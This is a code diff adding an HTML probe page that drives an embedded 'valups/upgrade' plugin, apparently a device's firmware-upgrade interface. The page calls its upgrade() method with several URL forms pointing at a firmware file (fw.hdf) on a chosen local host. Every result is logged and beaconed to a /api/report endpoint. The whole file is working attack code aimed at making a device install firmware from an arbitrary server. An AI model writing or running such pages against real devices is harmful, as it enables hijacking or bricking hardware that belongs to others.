@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<title>UPGRADE SCHEMELESS v10</title>
+<style type="text/css">
+html,body { margin:0; padding:0; width:1280px; height:720px; overflow:hidden; background:#0b0b0b; color:#ddd; font-family:Arial,Helvetica,sans-serif; font-size:12px; }
+#hdr { padding:6px 10px 0 10px; font-size:18px; color:#7CFC00; }
+#st { padding:0 10px 6px 10px; font-size:13px; color:#7CFC00; }
+.box { background:#000; border:1px solid #333; padding:4px; height:640px; margin:0 10px; }
+.row { border-bottom:1px solid #171717; padding:0; line-height:1.15; white-space:nowrap; overflow:hidden; }
+.k { color:#9ad; }
+.ok { color:#7CFC00; }
+</style>
+</head>
+<body>
+<div id="hdr">UPGRADE SCHEMELESS v10</div>
+<div id="st">booting…</div>
+<div class="box" id="log"></div>
+
+<object type="valups/upgrade" id="upgrade" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+
+<script type="text/javascript">
+var token = String(new Date().getTime()) + "-" + String(Math.floor(Math.random() * 1000000));
+var sent = 0, MAXROWS = 118;
+function esc(s){if(s===null||s===undefined)return "";return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}
+function setStatus(t){var e=document.getElementById("st");if(e)e.innerHTML=esc(t);}
+function add(k,v,cls){
+    var b=document.getElementById("log");
+    if(b.childNodes.length>=MAXROWS)return;
+    b.innerHTML += '<div class="row"><span class="k">'+esc(k)+':</span> <span class="'+(cls||'')+'">'+esc(v).substring(0,150)+'</span></div>';
+}
+function send(k,v){
+    try{
+        var im=new Image();
+        im.src="/api/report?token="+encodeURIComponent(token)+"&k="+encodeURIComponent(String(k).substring(0,120))+"&v="+encodeURIComponent(String(v).substring(0,340))+"&n="+(sent++)+"&r="+Math.random();
+    }catch(e){}
+}
+
+var VERIFY = "192.168.1.18:5080/fw.hdf";
+/* [tag, arg1, arg2] — all 2-arg (only that form returned status codes) */
+var CALLS = [
+  ["host8080", "192.168.1.18:5080/fw.hdf", 1],
+  ["host80",   "192.168.1.18/fw.hdf",      1],
+  ["sch_http", "http://192.168.1.18:5080/fw.hdf", 1],
+  ["protoff",  "//192.168.1.18:5080/fw.hdf", 1],
+  ["host8080b", "192.168.1.18:5080/fw.hdf", 1]
+];
+
+var CI = 0;
+function runCall(){
+    if(CI >= CALLS.length){
+        setStatus("calls done, observing 25s…");
+        send("battery.done", "calls_sent=" + CI);
+        setTimeout(function(){ send("observe.end", "window_closed"); setStatus("idle sent="+sent); }, 25000);
+        return;
+    }
+    var c = CALLS[CI++];
+    var u = document.getElementById("upgrade");
+    setStatus(CI+"/"+CALLS.length+" "+c[0]);
+    try{
+        var r = u.upgrade.call(u, c[1], c[2]);
+        var line = (typeof r) + ":" + (r===null?"NULL":String(r).substring(0,160));
+        add(c[0], line, "ok");
+        send("upg.call." + c[0], line);
+    }catch(e){
+        var line2 = "ERR:" + (e.message||e);
+        add(c[0], line2);
+        send("upg.call." + c[0], line2);
+    }
+    setTimeout(runCall, 5000);  /* spaced so DNS + connect attempts stay visible */
+}
+window.onload = function(){
+    var u=document.getElementById("upgrade");
+    send("plug.check", "upgFN=" + (u?typeof u.upgrade:"-"));
+    add("plugin", typeof (u&&u.upgrade), "ok");
+    setTimeout(runCall, 700);
+};
+</script>
+</body>
+</html>
